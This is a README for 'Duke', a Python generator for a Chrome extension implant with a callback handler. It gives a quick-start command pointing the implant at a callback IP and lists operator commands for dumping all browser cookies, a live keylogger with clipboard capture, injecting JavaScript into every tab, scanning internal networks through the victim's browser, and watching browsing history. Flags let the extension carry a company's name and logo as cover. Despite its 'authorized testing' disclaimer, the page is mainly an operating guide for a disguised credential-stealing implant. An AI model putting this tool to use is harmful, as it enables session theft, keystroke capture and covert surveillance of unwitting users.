# Duke - Browser Proxy Extension Framework

A single-file Python tool that generates a Chrome extension and interactive handler for browser-based HTTP proxying, session extraction, and input monitoring.

> **For educational and authorized security testing only.** Use exclusively in environments where you have explicit written permission. Unauthorized use against systems you do not own or have authorization to test is illegal.

## Quick Start

```bash
python3 duke_generate.py <listen_ip> <listen_port> <callback_ip> <callback_port> [flags]
```

This generates a `.zip` Chrome extension and starts the interactive handler.

**Example:**

```bash
python3 duke_generate.py 0.0.0.0 8081 10.10.14.148 8081
```

## Flags

| Flag | Description |
|---|---|
| `--https` | Force HTTPS callback (auto-detected for port 443) |
| `--fastpoll` | 200ms short-poll instead of default long-poll |
| `--company-logo <file.png>` | Custom extension icon |
| `--extension-name <name>` | Custom extension name |
| `--company-name <name>` | Company name (renames internal files, updates description) |

## Handler Commands

**HTTP Proxy**

| Command | Description |
|---|---|
| `get <url>` | GET request through the target browser |
| `post <url> <body>` | POST request |
| `postjson <url> <json>` | POST with JSON content type |
| `head <url>` | HEAD request |
| `save <file>` | Save last response or keylog session to file |

**Network Recon**

| Command | Description |
|---|---|
| `scan <url> <ports>` | Port scan via HTTP |
| `sweep <base> <start> <end>` | IP sweep |

**Forwarding Listeners**

| Command | Description |
|---|---|
| `add_listener <port>` | Start local HTTP proxy (use with Firefox/curl) |
| `listeners` | List active proxy listeners |
| `rm_listener <id>` | Remove a listener |

**Extraction**

| Command | Description |
|---|---|
| `cookie_stealer` | Dump all browser cookies |
| `save_cookies <file>` | Export cookies to JSON |

**Injection**

| Command | Description |
|---|---|
| `inject_javascript <file.js>` | Execute JS in all browser tabs |
| `injection_keylogger` | Live keylogger with clipboard capture (Enter ×3 to stop) |

**Monitoring**

| Command | Description |
|---|---|
| `url` | Show victim's current URL |
| `tab_history` | Browsing history for the session |
| `status` | Connection health check |

## Architecture

```
┌──────────────────┐         ┌───────────────┐         ┌──────────────┐
│  Handler (Python)│◄───────►│  Extension    │◄───────►│ Target Sites │
│  - /task         │  poll   │  (bg.js)      │  fetch  │ - localhost  │
│  - /result       │         │  service      │         │ - internal   │
│  - /keylog       │         │  worker       │         │ - any URL    │
│  - /tab_update   │         │               │         │              │
└──────────────────┘         └───────────────┘         └──────────────┘
```

The extension polls the handler for tasks, executes HTTP requests from the browser's context (inheriting cookies, sessions, and network position), and returns results. All traffic flows through the target browser.

## Requirements

- Python 3.x (standard library only)
- Chrome/Chromium browser on the target (potenially Safari, untested)

## Disclaimer

This tool is provided strictly for educational purposes and authorized penetration testing engagements. You are solely responsible for ensuring you have proper authorization before use. The authors assume no liability for misuse.

Placeholder image included during the default generation flow of the extension is not subject to the License attached to this project, and is owned solely by its intellectual property owner and/or publisher. In case of any infringement, it will be removed upon notice.
